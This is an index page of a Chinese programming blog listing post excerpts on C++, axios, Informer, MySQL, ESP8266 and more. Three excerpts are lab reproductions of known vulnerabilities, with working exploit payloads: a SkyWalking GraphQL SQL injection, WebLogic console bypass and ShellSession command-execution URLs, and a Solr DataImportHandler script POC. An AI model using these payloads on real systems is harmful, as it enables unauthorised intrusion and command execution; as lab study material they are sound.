<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a45c9ef1465b30e24254d7872d939cfb/" rel="bookmark">
			C&#43;&#43;头文件逻辑结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++中头文件（.h）和源文件（.cpp）都应该写些什么_lyanliu的博客-CSDN博客_.h文件和.cpp文件的区别
function.h: 定义function.cpp中需要引用的其他库，静态变量，函数声明，类等
function.cpp: 开头写上 #include”function.h“表明此函数与function.h链接上，为一个整体，之后在main.cpp中引用时只需用 function.h即可代表整个 function.h+function.cpp
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/744ba622a5218cd5a720bfbb805470f1/" rel="bookmark">
			CancelToken与interceptors实现请求取消
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一. 多次触发查询按钮时，取消其他查询请求，只保留最后一个。如果涉及到图表展示的，逻辑会稍需要一些处理，比如点击查询，显示loading，请求回来后，有数据则展示数据，无数据或者返回错误信息则显示未查到相关数据。
二、vue项目的实现方式 取消请求： if (this.cancelRequest){ this.cancelRequest() //取消前一个请求 } let CancelToken = axios.CancelToken this.$axios({ method: 'post', url: '/login/login', params: obj, cancelToken: new CancelToken((c)=&gt;{ this.cancelRequest = c //保存当前请求 }) }).then((res)=&gt;{ if(!res)return; //如果res被拦截，则不处理 //业务逻辑 }).catch((res)=&gt;{ this.loading = false }) 区分请求返回的错误信息. 如果是取消请求导致的，则一直处于loading状态，如果返回错误信息，则关闭loading,显示未查到相关数据。
怎么区分错误信息呢，axios有一个方法isCalcel可以判断是不是由取消请求导致的错误信息。
代码如下：
axios.interceptors.reaponse.use((res)=&gt;{ //请求拦截的代码 },(err)=&gt;{ if(!axios.isCancel(err) { //只拦截取消请求导致的错误信息 return err //这里如果没有return,响应回调函数里的res为undefined }) }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/430c01876ed40a8ac9c8eaa522f083e7/" rel="bookmark">
			Informer：对长时间序列预测更高效的Transformer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文：AAAI2021 | Informer: Beyond efficient transformer for long sequence time-series forecasting [1]
作者：Zhou H, Zhang S, Peng J, et al.
机构：北航、UC伯克利、Rutgers大学等
录播：https://www.bilibili.com/video/BV1RB4y1m714?spm_id_from=333.999.0.0
代码：https://github.com/zhouhaoyi/Informer2020
引用量：162
Informer是AAAI2021的最佳论文，主要是针对长时序预测任务（Long sequence time-series forecasting，LSTF），改进了Transformer。
一、历史瓶颈
图1展示了电力转换站的小时级温度预测，其中短期预测是0.5天（12个点），而长期预测是20天，480个点，其中当预测长度大于48个点时，整体表现会有明显的差异，LSTM的MSE和推理速度都在往很坏的方向发展。
图1：LSTM在不同预测长度上性能和准确性的分析
为了满足LSTF的挑战，模型需要有：能够有效地捕捉长序列输入和输出的相互依赖性。最近，Transformer在捕捉长期依赖性上，明显比RNN有着卓越的表现。但存在以下瓶颈：
1. 自关注机制的二次计算复杂度高：自关注机制的算子，即点积，导致时间复杂度和每层内存消耗量为 ；
2. 长序列输入下堆叠层的内存瓶颈：堆叠J层encoder/decoder层让内存使用率为 ，限制模型去接受更长的输入；
3. 预测长输出时推理速度慢：原始Transformer是动态解码，步进式推理很慢。
二、论文贡献
本文贡献如下：
1. 提出informer，能成功提高在LSTF问题上的预测能力，验证了Transformer模型的潜在价值，能捕获长序列时间序列输出和输入之间的个体长期相关性；
2. 提出ProbSparse自相关机制，使时间复杂度和内存使用率达到 ；
3. 提出自相关蒸馏操作，在J个堆叠层上突出关注分高的特征，并极大减少空间复杂度到 є ，这帮助模型接收长序列输入；
4. 提出生成式decoder，直接一次性多步预测，避免了单步预测产生的误差累积。
三、网络结构
Informer的网络结构示意图如下：
图2：网络结构示意图
在图2中：
● 左边：encoder接收大量长序列输入（绿色），Encoder里ProbSparse自关注替换了原自关注模块，蓝色梯形是自关注蒸馏操作，用于抽取主要关注，减少网络尺寸。堆叠层是用于增加鲁棒性。
● 右边：decoder接收长序列输入，用0填充预测部分的序列。它衡量特征map上加权关注成分，然后生成式预测橙色部分的输出序列。
1. ProbSparse Self-attention
ProbSparse Self-attention是Informer的核心创新点，我们都知道Transformer里，自关注是有query, key和value组成： 能帮助拥有更稳定的梯度，这也可以是其它可能值，但这个是默认的，Transformer作者是担心对于大的Key向量维度会导致点乘结果变得很大，将softmax函数推向得到极小梯度的方向，因此才将分数除以Key向量维度开方值。关于Transformer模型，可以阅读我的历史文章[2]。另外， 是非对称指数核函数 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/430c01876ed40a8ac9c8eaa522f083e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67aea2da3482385d6ad990481055c015/" rel="bookmark">
			深入理解区块链共识算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		区块链的概念： 区块链是一种去中心化、不可篡改、可追溯的分布式数据库系统[3]。区块链系统中底层网络采用对等式网络(P2P 网络)组织各个独立的网络节点。P2P网络是扁平式的拓扑结构, 网络中的每个节点地位对等, 不存在任何中心化的特殊节点和层级结构。因此区块链具备去中心化的特点, 系统中各节点相互独立, 具备相同的功能, 存储同样的信息, 相互监督;与传统分布式数据库不同, 各个节点独立存储完整的数据, 任何组织或个人无法完全控制所有数据, 只拥有本地数据的控制权, 任何单个节点对本地数据的修改不会对整个区块链产生影响, 因此区块链具备难以篡改性; 区块链把数据分成不同的区块, 每一个区块头都包含前一个区块的哈希摘要信息；如图 1 所示, 前后顺连形成一条链, 因此区块链具备可溯性。总体来说, 区块链融合了经济学的博弈论、计算机科学等多种技术, 比如P2P 网络协议, 块链结构、共识算法、非对称加密、激励机制等, 解决了数据可信问题。在无需借助可信第三方的情况下, 实现互不信任的多方对等可信的价值传输。 共识算法： 共识算法汇总： 共识算法的共识过程 算法的共识过程总体上分为三个阶段, 创建区块、验证区块, 提交区块。根据共识协议, 从参与共识过程的节点中选择主节点创建新区块(定义主节点为每轮共识过程中产生有效区块的节点); 然后新区块交由其他参与共识的节点进行独立验证; 通过验证的新区块会被节点提交到本地区块链中, 达成对最新高度区块的共识; 至此完成共识, 开启下一轮共识过程。
共识算法分类 共识算法的分类方式有很多, 比如在性能层面: 从数据一致性的角度将共识算法分为强一致性共识算法、弱一致性(最终一致性)共识算法; 从拜占庭容错的角度将共识算法分为拜占庭容错共识算法、非拜占庭容错共识算法。在应用层面: 可以将共识算法分为适用于公链、联盟链、私链的共识算法。从共识过程出发, 按照主节点的产生方式将共识算法分为竞争类、选举类、随机类以及其他类型。
竞争类 竞争类大概有这几种 PoW (Proof of Work)、PoS (Proof of Stake)、PoSpace (Proof of Sapce) PoW 共识算法中, 所有参与共识的节点通过消耗算力解决数学难题来竞争成为主节点, 由最先解决数学难题的节点成为主节点。PoS 将算力竞争转化为权益竞争, 不仅节约算力, 权益的引入也能够防止节点发动恶意攻击; 同时促使所有节点有责任维护区块链的安全稳定运行以保障自身权益; PoS 虽然降低了算力资源的消耗, 但是没有解决中心化程度增强的问题, 新区块的生成趋向于权益高的节点。PoSpace 共识算法使用存储空间代替计算, 节约电力资源; 同时该共识协议下, 节点初次接入网络时确定存储空间大小, 之后不能扩容, 防止了 PoW共识算法中“矿池”(将不同节点的算力集合成一个大的算力节点)的出现, 一定程度上避免了中心化程度增强的问题, 同时降低了安全风险。 竞争类算法共识过程：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67aea2da3482385d6ad990481055c015/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f1386f0bf0e134a3917afa5e66f9c8f/" rel="bookmark">
			数据的对齐存放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
数据对齐概念
对齐
边界对齐
边界不对齐
最简单的对齐策略
对齐举例
对齐方式的设定
数据对齐概念 Alignment:要求数据的地址是相应的边界地址
目前机器字长为32位或64位，主存按一个传送单位（32/64/128位）进行存取，而按字节编址，例如：若传送单位为64位，则每次最多读写64位，即：第0~7字节同时读写，第8~15字节同时读写，……，以此类推。按边界对齐，可使读写数据位于8i~8i+7(i=0,1,2,…) 单元指令系统支持对字节、半字、字及双字的运算各种不同长度的数据存放时，有两种处理方式:
– 按边界对齐（若一个字为32位）
• 字地址：4的倍数(低两位为0)
• 半字地址：2的倍数(低位为0)
• 字节地址：任意
– 不按边界对齐
坏处：可能会增加访存次数！ 对齐 假设1个字=32位，主存每次最多存取一个字，按字节编址，则每次只能读写某个字地址开始的4个单元中连续的1、2、3或4个字节 。
边界对齐 例如：int i, short k, double x, char c，变量按如下顺序在内存中存储，则：&amp;i=0; &amp;k=4; &amp;x=8; &amp;c=16;。
取x：需要2个周期
取j：需要1个周期
边界不对齐 &amp;i=0; &amp;k=4; &amp;x=6; &amp;c=14;
取x：3个周期
取j：2个周期
最简单的对齐策略 按其数据长度进行对齐。
– Windows采用策略：int型地址是4的倍数，short型地址是2的倍数，double和long long型的是8的倍数，float型的是4的倍数，char不对齐Linux采用更宽松策略：short型是2的倍数，其他类型如int、float、double和指针等都是4的倍数 对齐举例 struct S1 { int i; char c; int j; }; struct S2 { int i; int j; char c; }; 在要求对齐的情况下，哪种结构声明更好？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f1386f0bf0e134a3917afa5e66f9c8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/258ecd53aedf6743844c422eecd090e4/" rel="bookmark">
			服务调用：OpenFeign详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 OpenFeign基本介绍概述为什么要使用FeignFeign vs OpenFeignFeign的实现流程 OpenFeign使用步骤OpenFeign超时控制OpenFeign日志增强OpenFeign文件传输 OpenFeign基本介绍 概述 服务之间如果需要相互访问，可以使用RestTemplate， 也可以使用 Feign客户端访问。它默认会使用Ribbon来实现负载均衡。
可以理解为Feign是一个超级方便的调用Spring Cloud远程服务的框架/工具，帮助开发者以更少耦合，更少代码，更快更兼容的方法进行远程服务调用。
什么是服务调用
顾名思义，就是服务之间的接口互相调用，在微服务架构中很多功能都需要调用多个服务才能完成某一项功能。
为什么要使用Feign Feign 旨在使编写 JAVA HTTP 客户端变得更加简单，Feign 简化了RestTemplate代码，实现了Ribbon负载均衡，使代码变得更加简洁，也少了客户端调用的代码，使用 Feign 实现负载均衡是首选方案，只需要你创建一个接口，然后在上面添加注解即可。
Feign 是声明式服务调用组件，其核心就是：像调用本地方法一样调用远程方法，无感知远程 HTTP 请求。让开发者调用远程接口就跟调用本地方法一样的体验，开发者完全无感知这是远程方法，无需关注与远程的交互细节，更无需关注分布式环境开发。
Feign vs OpenFeign Feign内置了Ribbon，用来做客户端负载均衡调用服务注册中心的服务。
Feign 支持的注解和用法参考官方文档：https://github.com/OpenFeign/feign官方文档，使用 Feign 的注解定义接口，然后调用这个接口，就可以调用服务注册中心的服务。
Feign本身并不支持Spring MVC的注解，它有一套自己的注解，为了更方便的使用Spring Cloud孵化了 OpenFeign。并且支持了Spring MVC的注解，如@RequestMapping，@PathVariable等等。
OpenFeign的 @FeignClient可以解析Spring MVC的@RequestMapping注解下的接口，并通过动态代理方式产生实现类，实现类中做负载均衡调用服务。
Feign的实现流程 首先通过 @EnableFelgnClients注解开启FeignClient的功能 ，只有这个注解存在，才会在程序启动时开启对 @FeignClient注解的包扫描。根据Feign的规则实现接口，并在接口上加上@FeignClient注解。程序启动后，会进行包扫描，扫描所有的@FeignClient注解的类，并将这些信息注入到lOC容器中。当接口中的方法被调用时，通过JDK的动态代理生成具体的 RequestTemplate模板对象 。根据RequestTemplate再生成HTTP的Request对象。Request对象交给Client处理，其中Client网络请求框架可以是 HttpURLConnection, HttpClient与OkHttp（主要看依赖是什么)。最后，Client被封装到LoadBalanceClient类，该类结合Ribbon做到了负载均衡。 OpenFeign使用步骤 1、服务消费端的POM文件添加依赖
&lt;!-- spring cloud openfeign --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; 2、yml配置文件
server: port: 80 spring: application: name: cloud-consumer-service eureka: client: #表示是否将自己注册进Eurekaserver默认为true。 register-with-eureka: true #是否从EurekaServer抓取已有的注册信息，默认为true。单节点无所谓，集群必须设置为true才能配合ribbon使用负载均衡 fetchRegistry: true service-url: defaultZone: http://localhost:7001/eureka 3、启动类添加@EnableFeignClients注解
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/258ecd53aedf6743844c422eecd090e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ffc01d715ee4ff53b81f1a76c355a68/" rel="bookmark">
			web API-DOM操作元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.变量声明 有了变量先使用const,如果发现它后面是要修改的,在改为let
cost里面存地址,建议数组和对象使用const来声明 存储应用类型（数组）在栈内存地址，地址不变可修改值 可以修改，基本类型不能修改
webapi作用和分类 WEB APIS：操作网页文档或者浏览器的接口（方法）
DOM：操作文档接口
BOM：操作浏览器的接口
DOM树
将html文档以树状结构直观的表现出来 作用文档树直观的体现了标签与标签之间的关系 标签对应元素节点 dom树保留节点与节点关系
获取DOM元素 操作谁，先获取谁
语法：document.querySelector('css选择器') 获取单个元素
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="box"&gt;123&lt;/div&gt; &lt;div class="box1"&gt;456&lt;/div&gt; &lt;p id="nav"&gt;&lt;/p&gt; &lt;ul&gt; &lt;li&gt;测试&lt;/li&gt; &lt;li&gt;测试&lt;/li&gt; &lt;li&gt;测试&lt;/li&gt; &lt;/ul&gt; &lt;script&gt; // 选择匹配的第一个元素 document.querySelector // const box (变量名可更改)=document.querySelector('div')选择器不可修改 const box=document.querySelector('.box') console.log(box); const nav=document.querySelector('#nav') console.log(nav); /* //获取第一个小li const li =document.querySelector('ul li:first-child') console.log(li); */ //获取多个元素 document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ffc01d715ee4ff53b81f1a76c355a68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfe905bac3368753f4d3e95d24db1554/" rel="bookmark">
			Apache-Skywalking-SQL注入(CVE-2020-9483)复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		漏洞描述
Apache SkyWalking 是一款应用性能监控（APM）工具，对微服务、云原生和容器化应用提供自动化、高性能的监控方案。当Apache SkyWalking使用H2 / MySQL / TiDB作为Apache SkyWalking存储时，通过GraphQL协议查询元数据时，存在SQL注入漏洞，该漏洞允许访问未指定的数据。 Apache SkyWalking 6.0.0到6.6.0、7.0.0 H2 / MySQL / TiDB存储实现不使用适当的方法来设置SQL参数。
影响版本
Apache SkyWalking 6.0.0 to 6.6.0, 7.0.0
实验工具：docker搭配vulhub-master，burpsuite、Firefox
漏洞复现
进入到/vulhub-master/skywalking/8.3.0-sqli文件夹下，创建所需环境
#docker-compose up -d 随后在物理机上访问你的 ip:端口号（默认8080），进入到Apache-Skywalking页面：
使用burpsuite抓包，抓取到的报如下：
修改数据包的请求体：
{ "query":"query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total logs { serviceId serviceName isError content } } } ", "variables":{ "condition":{ "metricName":"sqli", "state":"ALL", "paging":{ "pageSize":10 } } } } 如图提交POC之后爆出了h2的版本：
网络上很多都是使用另一种POC
POST /graphql HTTP/1.1 Host: ip:8080 Content-Type: application/json;charset=utf-8 Content-Length: 313 Connection: close {"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bfe905bac3368753f4d3e95d24db1554/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe3d37815fab70c69f4bc162a0ad1d00/" rel="bookmark">
			Weblogic Server RCE（CVE-2020-14882、CVE-2020-14883）复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		复现场景：docker、CentOS7、windows物理机
浮现过程：
使用vulhub-master配合docker搭建，进入weblogic/CVE-2020-14882文件夹下搭建环境：
docker-compose up -d 成功搭建后在物理机上访问靶机IP+端口（默认7001），如下图所示：
访问靶机IP+端口（默认7001）/console如下图所示：
首先复现CVE-2020-14882绕过验证权限漏洞：
访问URL：
http://靶机IP:7001/console/css/%252e%252e%252fconsole.portal 成功绕过权限：
然后复现第二个漏洞 CVE-2020-14883，这个漏洞的利用方式有两种，一是通过com.tangosol.coherence.mvel2.sh.ShellSession，另一个是com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext，这里先复现第一种：
访问URL：
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');") 访问后会跳转到404页面，并且在镜像容器里tmp文件夹下创建一个success1文件（本质上就是执行了exec括号里的命令）：
进入CentOS7容器内查看：
docker exec -it 镜像ID /bin/bash 成功执行了命令创建了success1文件。
但这个方法只能在Weblogic 12.2.1以上版本利用，10.3.6不存在com.tangosol.coherence.mvel2.sh.ShellSession类。
第二种写入方法待补充
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18305318c1a95f38f9ea1475f4defee3/" rel="bookmark">
			Apache solr 远程代码执行漏洞（CVE-2019-0193）复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0x00：复现环境
靶机：CentOS7、docker、vulhub-master
攻击机：windows10
0x01：复现过程（数据包提交）
在/vulhub-master/solr/CVE-2019-0193/下启动镜像：
docker-compose up -d 然后攻击机访问靶机IP:8983(默认端口号)
如图访问成功：
随后运行命令：
docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 攻击者需要知道Solr服务中Core的名称才能执行攻击。此命令其实本质上是向其加入test核心以便于测试
访问192.168.64.183:8983/solr/admin/cores查看Core的名称：
在打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC：
&lt;dataConfig&gt; &lt;dataSource type="URLDataSource"/&gt; &lt;script&gt;&lt;![CDATA[ function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success"); } ]]&gt;&lt;/script&gt; &lt;document&gt; &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:poc" /&gt; &lt;/document&gt; &lt;/dataConfig&gt; 之后点击Execute with this Confuguration会发送以下请求包：
POST /solr/test/dataimport?_=1641970441677&amp;indent=on&amp;wt=json HTTP/1.1 Host: 192.168.64.183:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 678 Origin: http://192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18305318c1a95f38f9ea1475f4defee3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e54f041923a202ae14316d4c6708d83/" rel="bookmark">
			【MySQL索引&amp;事务】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL索引&amp;事务 文章目录 MySQL索引&amp;事务1. 索引1.1 概念1.2 作用1.3 使用场景1.4 索引的数据结构1.4.1 B树1.4.2 B+树 1.5 索引的使用 2. 事务2.1 什么是事务2.2 为什么使用事务2.3 事务的使用2.4 事务的基本特性 1. 索引 1.1 概念 索引是一种特殊的文件，包含着对数据表里所有记录的引用指针。可以对表中的一列或多列创建索引，
并指定索引的类型，各类索引有各自的数据结构实现
1.2 作用 数据库中的表、数据、索引之间的关系，类似于书架上的图书、书籍内容和书籍目录的关系。索引所起的作用类似书籍目录，可用于快速定位、检索数据，加快查找效率索引对于提高数据库的性能有很大的帮助。 1.3 使用场景 要考虑对数据库表的某列或某几列创建索引，需要考虑以下几点：
数据量较大，且经常对这些列进行条件查询该数据库表的插入操作，及对这些列的修改操作频率较低索引会占用额外的磁盘空间 满足以上条件时，考虑对表中的这些字段创建索引，以提高查询效率
如果非条件查询列，或经常做插入修改操作，或磁盘空间不足时，不考虑创建索引
1.4 索引的数据结构 现在我们已经了解的数据结构有顺序表，二叉搜索树，哈希表等等，那么索引的数据结构是什么呢？
顺序表查找是在内存中，内存访问速度快，顺序表中数据也不多，所以查找效率不低，
但是如果针对数据库进行顺序查找，因为数据库是存储在磁盘上的，磁盘访问速度慢，并且数据库的数据量可能非常多，所以查找效率会非常低，所以索引的数据结构不是顺序表 二叉搜索树的中序遍历是有序的，可以进行范围查找，效率是O(N)，
但是当数据量非常大时，二叉搜索树的高度就会很高，需要递归的次数就变多，效率就会越低。二叉搜索树每个节点只能存储一个记录，一次查询在树上找的时候花费的磁盘IO次数较多而且二叉搜索树获取中序遍历结果的效率也不高O(N)。如果是平衡二叉搜索树，查找效率就是O(log N)。但哈希表查找效率是O(1)，所以索引的数据结构可能考虑哈希表。 对于哈希表：虽然查找效率高，但是哈希表只能处理相等的情况，不能处理范围查找的逻辑。
数据库真正索引的数据结构是一种N叉搜索树，也就是B+树
了解B+树之前，要先认识B树。
1.4.1 B树 B树和二叉树的区别：
每个节点是N叉每个节点可能存储多个数据每个节点村的数据的个数和该节点的度相关 度=存储数据个数+1在B树上查找就是N分查找，查找效率更高由于每个节点存储多个数据，相比于二叉树，保存相同数据个数时，B树高度比二叉树低更容易处理范围查找 1.4.2 B+树 与B树相比：
每一层的元素之间都连接起来(链表) 不用进行额外的中序遍历，遍历链表就可以得到中序遍历的结果，处理范围查找效率更高数据只在叶子节点上保存 所以B+树从根到每一个叶子节点的路径长度相同非叶子节点只保存辅助查找的边界信息 不存储实际记录叶子节点存储到磁盘上，非叶子节点存储到内存上，查找效率更高 索引的影响：
索引会减慢插入，删除和修改的效率，每次插入删除修改的时候可能需要同步调整索引结构索引也会占用额外的空间 (空间换取时间) 1.5 索引的使用 创建主键约束，唯一约束，外键约束时，会自动创建对应列的索引
查看索引 show index from 表名; -- 查看学生表已有的索引 show index from student; 创建索引 对于非主键，非唯一约束，非外键的字段，可以创建普通索引
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e54f041923a202ae14316d4c6708d83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d78b3d0632f18eac401980075d40c2a1/" rel="bookmark">
			ESP8266 smartconfig 配网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于ESP8266的配网模式，本人实际接触到的配网有smartconfig和零配网模式
1、smartconfig配网需要用户输入热点的SSID和密码，实际上就是手机端、路由器和通信模块三者之间的一种交互方式，在短时间内，是一种相对稳定和安全的方式，让通信模块连接上指定的路由器，进而获取上网的流量，具体详细请自行了解smartconfig工作原理等。
2、零配网相比smartconfig而言就方便很多，实际上就是路由器、通信模块和已经连接联网设备三者之间的联系，比如之前做过的天猫精灵智能灯，使用的是零配网模式，通过天猫精灵音响通过WIFI对设备进行配网，具体详细请自行了解零配网的相关资料
使用ESP8266 进行 SDK 开发，smartconfig微信配网的代码如下
#include "user_config.h"	// 用户配置 #include "driver/uart.h" // 串口 #include "c_types.h"	// 变量类型 #include "eagle_soc.h"	// GPIO函数、宏定义 #include "ip_addr.h"	// 被"espconn.h"使用。在"espconn.h"开头#include"ip_addr.h"或#include"ip_addr.h" #include "espconn.h"	// TCP/UDP接口 #include "ets_sys.h"	// 回调函数 #include "mem.h"	// 内存申请等函数 #include "os_type.h"	// os_XXX #include "osapi.h" // os_XXX、软件定时器 #include "smartconfig.h"	// 智能配网 #include "user_interface.h" // 系统接口、system_param_xxx接口、WIFI、RateContro #define	ProjectName	"SmartConfig_WeChat"	// 工程名宏定义 #define	Sector_STA_INFO	0x80	// 【STA参数】保存扇区 struct station_config STA_INFO;	// 【STA】参数结构体 os_timer_t OS_Timer_IP;	// 软件定时器 struct ip_info ST_ESP8266_IP;	// 8266的IP信息 u8 ESP8266_IP[4];	// 8266的IP地址 //================================================================================== // 毫秒延时函数 //=========================================== void ICACHE_FLASH_ATTR delay_ms(u32 C_time) {	for(;C_time&gt;0;C_time--) os_delay_us(1000); } //=========================================== // SmartConfig状态发生改变时，进入此回调函数 //-------------------------------------------- // 参数1：sc_status status / 参数2：无类型指针【在不同状态下，[void *pdata]的传入参数是不同的】 //================================================================================================================= void ICACHE_FLASH_ATTR smartconfig_done(sc_status status, void *pdata) { os_printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d78b3d0632f18eac401980075d40c2a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a42fb396101579aa088cdebd9f74648f/" rel="bookmark">
			AD20绘制板边框
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在机械层（Mechanical 1）用线条（PL）画出边框
2.选中边框的一条边，按Tab键可以全选刚才绘制的边框，执行快捷键(DSD)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfbc9c52462dd8d70f0b4527c36872dd/" rel="bookmark">
			Sublime使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、汉化二、修改字体三、总结 一、汉化 Sublime Text 4 软件本身是支持汉化的，但是需要安装插件，不需要再去找汉化包之类
首先我们需要调出命令面板：点击“Tools”-》Commadn Palette或者直接按下快捷键Ctrl+shift+p调出 在调出的页面输入：Install Package，如图： 点击[Package control:Install Package] 进行安装，这时左下角会有进度条
安装完成以后会自动弹出一个提示，如图：
也可以通过[Preferences]-[Package Control]-[Install Package]调出控制台
在调出的控制台输入：ChineseLocalzations
安装成功以后，在Help-&gt;出现Language选项，可以更换语言
二、修改字体 Sublime Text 4 采用的是配置文件的形式来更改设置，这和之前是有很大区别的
点击Preferences-&gt;settings,如图：
我这里的使用的字体是“宋体”
{ "font_face": "宋体", "font_size": 16, } 三、总结 提示：这里对文章进行总结：
简单介绍了Sublime Text 4目前是最新版以及汉化，设置字体，大小等等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5121ccb65a3c5281cc01611cffc262dd/" rel="bookmark">
			uniapp开发小程序时，css设置的背景图无法显示？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 uniapp开发小程序时，css设置的背景图无法显示问题：（如何解决） 第一种方式：
将图片转为base64格式。
使用站长工具， base64图片在线转换工具(https://tool.chinaz.com/tools/imgtobase)
第二种方式：
&lt;view class="item" :style="{background: 'url('+imageURL+')'}"&gt;&lt;/view&gt; &lt;script&gt; export default { data() { return { imageURL: '/static/imgs/cj_bg@2x.png' }; } } &lt;/script&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9679b8c1a4e32d37586328ffa532a7c3/" rel="bookmark">
			二叉树的最近公共祖先Python解法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。
